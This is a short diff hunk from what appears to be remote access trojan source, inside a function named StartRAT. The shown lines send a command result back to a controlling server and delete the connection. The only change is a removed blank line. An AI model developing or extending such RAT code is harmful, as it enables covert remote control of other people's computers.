@@ -22,7 +22,6 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 
 		// send result back to server
 		conn->send_data(result);
-
 	}
 	delete conn;
 
